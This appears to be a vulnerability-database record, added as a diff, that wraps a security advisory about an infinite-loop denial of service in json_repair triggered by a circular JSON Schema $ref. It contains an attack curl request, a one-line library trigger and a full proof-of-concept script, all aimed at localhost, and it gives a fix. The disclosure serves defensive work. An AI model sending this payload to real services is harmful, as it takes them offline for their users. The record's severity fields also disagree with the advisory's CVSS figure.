@@ -1,0 +1,344 @@
+[basic]
+description = '''
+## Circular JSON Schema `$ref` causes unbounded CPU DoS in `json_repair`
+
+### Summary
+
+`SchemaRepairer.resolve_schema()` in `json_repair` follows JSON Schema `$ref` pointers in an unbounded `while` loop without any cycle detection. An attacker who can supply a schema containing a self-referencing `$ref` (e.g., via the demo Flask API or any application that passes untrusted input to `loads(..., schema=...)`), can cause a worker process to spin indefinitely on CPU, resulting in a complete denial of service. No authentication is required against the public demo API. The vulnerability is confirmed reproducible at CVSS 7.5 (High).
+
+### Details
+
+`SchemaRepairer.resolve_schema()` at `src/json_repair/schema_repair.py:184–190` resolves `$ref` chains using a plain `while` loop:
+
+```python
+# src/json_repair/schema_repair.py:184-190
+schema_dict = cast(\"dict[str, Any]\", schema)
+while \"$ref\" in schema_dict:
+    ref = schema_dict[\"$ref\"]
+    resolved = self._resolve_ref(ref)
+    if isinstance(resolved, bool):
+        return resolved
+    schema_dict = resolved
+```
+
+`_resolve_ref()` at `src/json_repair/schema_repair.py:654–665` always resolves references relative to `self.root_schema`, which is initialised from the caller-supplied schema (`src/json_repair/schema_repair.py:130`). When the schema contains a circular reference such as:
+
+```json
+{\"$ref\": \"#/definitions/a\", \"definitions\": {\"a\": {\"$ref\": \"#/definitions/a\"}}}
+```
+
+`_resolve_ref()` returns the same `dict` object on every iteration, so `\"$ref\" in schema_dict` is always `True` and the loop never terminates.
+
+The vulnerable sink is reachable without authentication through the demo Flask API:
+
+```python
+# docs/app.py:14, 21-36
+data = request.get_json()
+schema = data.get(\"schema\")
+if schema is not None and not isinstance(schema, (dict, bool)):
+    raise ValueError(\"schema must be a JSON object or boolean.\")
+...
+if schema is not None:
+    loads_kwargs[\"schema\"] = schema
+parsed_json = loads(malformed_json, **loads_kwargs)
+```
+
+The only guard is a top-level `isinstance(dict, bool)` check; there is no `$ref` depth limit, no visited-set, and no timeout enforced by the library. The full data-flow path is:
+
+1. `docs/app.py:14` — `request.get_json()` reads the attacker-controlled HTTP body.
+2. `docs/app.py:21–23` — `schema` is extracted; only `dict`/`bool` type check applied.
+3. `docs/app.py:33–36` — schema is forwarded verbatim to `loads()`.
+4. `src/json_repair/json_repair.py:145–148` — `schema_from_input(schema)` instantiates `SchemaRepairer`.
+5. `src/json_repair/json_repair.py:160` — `repairer.is_valid()` calls `resolve_schema()`, triggering the infinite loop.
+6. `src/json_repair/schema_repair.py:184–190` — unbounded `while \"$ref\" in schema_dict` loop (sink).
+7. `src/json_repair/schema_repair.py:654–665` — `_resolve_ref()` returns the same object on every call.
+
+**Recommended fix:**
+
+```diff
+--- a/src/json_repair/schema_repair.py
++++ b/src/json_repair/schema_repair.py
+     def resolve_schema(self, schema: object | None) -> dict[str, Any] | bool:
+         ...
+-        schema_dict = cast(\"dict[str, Any]\", schema)
++        schema_dict = cast(\"dict[str, Any]\", schema)
++        seen_schema_ids: set[int] = set()
+         while \"$ref\" in schema_dict:
+             ref = schema_dict[\"$ref\"]
++            if not isinstance(ref, str):
++                raise SchemaDefinitionError(\"$ref must be a string.\")
++            schema_id = id(schema_dict)
++            if schema_id in seen_schema_ids:
++                raise SchemaDefinitionError(f\"Circular $ref detected: {ref}\")
++            seen_schema_ids.add(schema_id)
+             resolved = self._resolve_ref(ref)
+             if isinstance(resolved, bool):
+                 return resolved
+             schema_dict = resolved
+         return schema_dict
+```
+
+### PoC
+
+**Environment setup:**
+
+```bash
+# Clone the affected version
+git clone https://github.com/mangiucugna/json_repair.git
+git -C json_repair checkout 0015c74c01bdafe4bb7435780657501741c2a5f7
+
+# Install dependencies
+pip install flask flask-cors jsonschema pydantic
+pip install -e json_repair/
+
+# Start the demo API
+PYTHONPATH=json_repair/src flask --app json_repair/docs/app run --host=127.0.0.1 --port=5005
+```
+
+**Alternatively, use the provided Docker image:**
+
+```dockerfile
+FROM python:3.11-slim
+WORKDIR /app
+COPY repo/ /app/repo/
+RUN pip install --no-cache-dir flask flask-cors jsonschema pydantic && \
+    pip install --no-cache-dir -e /app/repo/
+COPY vuln-001/poc.py /app/poc.py
+CMD [\"python3\", \"/app/poc.py\"]
+```
+
+```bash
+docker build -t vuln001-json-repair -f vuln-001/Dockerfile .
+docker run --rm vuln001-json-repair
+```
+
+**HTTP attack request (demo API):**
+
+```bash
+timeout 5 curl -sS -X POST http://127.0.0.1:5005/api/repair-json \
+  -H 'Content-Type: application/json' \
+  --data '{\"malformedJSON\":\"{}\",\"schema\":{\"$ref\":\"#/definitions/a\",\"definitions\":{\"a\":{\"$ref\":\"#/definitions/a\"}}}}'
+# Expected: no response before timeout; curl exits with code 124
+```
+
+**Direct library attack:**
+
+```bash
+timeout 5 python3 - <<'PY'
+from json_repair import loads
+schema = {\"$ref\": \"#/definitions/a\", \"definitions\": {\"a\": {\"$ref\": \"#/definitions/a\"}}}
+print(loads(\"{}\", schema=schema))
+PY
+# Expected: process killed after 5 s; exit code 124
+```
+
+**Observed results (from Docker-based dynamic reproduction):**
+
+- Baseline (valid schema `{\"type\":\"object\",\"properties\":{\"name\":{\"type\":\"string\"}}}`): completed in **0.261 s**.
+- Attack (circular `$ref` schema): **timed out after 5.01 s** — process killed; infinite loop confirmed.
+
+### Impact
+
+This is an unauthenticated **denial-of-service** vulnerability. Any single HTTP request carrying a circular `$ref` schema hangs the Flask worker process indefinitely, making the service unavailable to all other users until the process is killed or the server is restarted. Because the public demo API (`docs/app.py`) accepts the `schema` field from the request body without authentication and passes it directly to `loads()`, remote attackers can exploit this with a trivial one-liner.
+
+Beyond the demo API, any application that exposes `json_repair.loads(..., schema=<user-controlled>)` to untrusted callers is equally affected. The vulnerability requires no special privileges, produces no useful output for the attacker (confidentiality and integrity are unaffected), and is deterministically reproducible.
+
+### Reproduction artifacts
+
+#### `Dockerfile`
+
+```dockerfile
+FROM python:3.11-slim
+
+WORKDIR /app
+
+# Copy the vulnerable json_repair repository (build context is the report root)
+COPY repo/ /app/repo/
+
+# Install Flask demo API dependencies and schema extras
+RUN pip install --no-cache-dir \
+        flask \
+        flask-cors \
+        jsonschema \
+        pydantic && \
+    pip install --no-cache-dir -e /app/repo/
+
+# Copy the proof-of-concept script
+COPY vuln-001/poc.py /app/poc.py
+
+CMD [\"python3\", \"/app/poc.py\"]
+```
+
+#### `poc.py`
+
+```python
+#!/usr/bin/env python3
+\"\"\"
+PoC for VULN-001: Circular JSON Schema $ref causes unbounded CPU DoS
+CWE-835 — Loop with Unreachable Exit Condition
+
+Affected: json_repair <= 0.59.10 (commit 0015c74)
+Sink:     src/json_repair/schema_repair.py:185
+          SchemaRepairer.resolve_schema() while loop follows $ref without cycle detection.
+
+Attack schema:
+    {\"$ref\": \"#/definitions/a\", \"definitions\": {\"a\": {\"$ref\": \"#/definitions/a\"}}}
+
+When passed to loads(..., schema=<above>), resolve_schema() enters an infinite loop
+because _resolve_ref() always returns the same dict object from root_schema.
+
+Verdict logic:
+  - Baseline (valid schema) must complete in < TIMEOUT seconds.
+  - Attack (circular $ref) must still be running at TIMEOUT seconds.
+  Both conditions together constitute deterministic proof of the vulnerability.
+\"\"\"
+
+import os
+import subprocess
+import sys
+import tempfile
+import time
+
+# Seconds to wait before declaring the attack confirmed (infinite loop)
+TIMEOUT_SECONDS = 5
+
+CIRCULAR_SCHEMA = {
+    \"$ref\": \"#/definitions/a\",
+    \"definitions\": {
+        \"a\": {\"$ref\": \"#/definitions/a\"}
+    }
+}
+
+NORMAL_SCHEMA = {
+    \"type\": \"object\",
+    \"properties\": {
+        \"name\": {\"type\": \"string\"}
+    }
+}
+
+_RUNNER_TEMPLATE = \"\"\"\
+import sys
+sys.path.insert(0, '/app/repo/src')
+from json_repair import loads
+schema = {schema_repr}
+result = loads('{{}}', schema=schema)
+print(result)
+\"\"\"
+
+
+def run_schema_test(schema: dict, timeout: int) -> tuple[bool, float, str]:
+    \"\"\"
+    Run json_repair loads() with the given schema in an isolated subprocess.
+
+    Returns:
+        timed_out (bool): True if the process was still running at `timeout` seconds.
+        elapsed (float): Wall-clock seconds until completion or kill.
+        output (str): stdout/stderr excerpt.
+    \"\"\"
+    script_content = _RUNNER_TEMPLATE.format(schema_repr=repr(schema))
+
+    with tempfile.NamedTemporaryFile(mode=\"w\", suffix=\".py\", delete=False) as fh:
+        fh.write(script_content)
+        script_path = fh.name
+
+    start = time.monotonic()
+    try:
+        proc = subprocess.run(
+            [sys.executable, script_path],
+            timeout=timeout,
+            capture_output=True,
+            text=True,
+        )
+        elapsed = time.monotonic() - start
+        output = (proc.stdout.strip() or proc.stderr.strip())[:400]
+        return False, elapsed, output
+    except subprocess.TimeoutExpired:
+        elapsed = time.monotonic() - start
+        return True, elapsed, f\"[no output — process killed after {elapsed:.2f}s]\"
+    finally:
+        os.unlink(script_path)
+
+
+def main() -> int:
+    print(\"=\" * 64)
+    print(\"VULN-001 PoC: Circular $ref JSON Schema DoS\")
+    print(\"json_repair SchemaRepairer.resolve_schema() — CWE-835\")
+    print(\"=\" * 64)
+
+    # --- Test 1: baseline (must complete quickly) ---
+    print(f\"\n[TEST 1] Baseline — valid schema (expect completion < {TIMEOUT_SECONDS}s)\")
+    timed_out_baseline, elapsed_baseline, output_baseline = run_schema_test(
+        NORMAL_SCHEMA, TIMEOUT_SECONDS
+    )
+    if timed_out_baseline:
+        print(f\"  UNEXPECTED TIMEOUT after {elapsed_baseline:.2f}s — environment issue\")
+        baseline_ok = False
+    else:
+        print(f\"  COMPLETED in {elapsed_baseline:.3f}s  ->  {output_baseline}\")
+        baseline_ok = True
+
+    # --- Test 2: circular $ref attack (must time out) ---
+    print(
+        f\"\n[TEST 2] Attack — circular $ref schema\"
+        f\" (expect hang > {TIMEOUT_SECONDS}s)\"
+    )
+    print(f\"  Schema: {CIRCULAR_SCHEMA}\")
+    timed_out_attack, elapsed_attack, output_attack = run_schema_test(
+        CIRCULAR_SCHEMA, TIMEOUT_SECONDS
+    )
+    if timed_out_attack:
+        print(
+            f\"  TIMED OUT after {elapsed_attack:.2f}s \"
+            f\"— infinite loop CONFIRMED (VULNERABLE)\"
+        )
+        attack_confirmed = True
+    else:
+        print(
+            f\"  Completed in {elapsed_attack:.3f}s  ->  {output_attack}\"
+            f\"\n  (patched or not triggered — check installation)\"
+        )
+        attack_confirmed = False
+
+    # --- Summary ---
+    print(\"\n\" + \"=\" * 64)
+    if baseline_ok and attack_confirmed:
+        print(\"VERDICT: PASS\")
+        print(\"  Normal schema  : returned in under 1 s\")
+        print(f\"  Circular $ref  : still running after {TIMEOUT_SECONDS}s (killed)\")
+        print(\"  Conclusion: resolve_schema() enters an unbounded loop on circular $ref.\")
+        return 0
+    elif not attack_confirmed:
+        print(\"VERDICT: FAIL — circular $ref did not cause an infinite loop\")
+        print(\"  The library may already be patched in this build.\")
+        return 2
+    else:
+        print(\"VERDICT: FAIL — baseline test failed; check the environment\")
+        return 3
+
+
+if __name__ == \"__main__\":
+    sys.exit(main())
+```
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "json_repair: Circular JSON Schema `$ref` causes unbounded CPU DoS"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-xf7x-x43h-rpqh"]
+ave_id = "AVE-2026-1234"
+
+[meta]
+collected_at = "2026-08-06T15:18:35.470206117+00:00"
+status = "completed"
+
+[references]
+urls = []
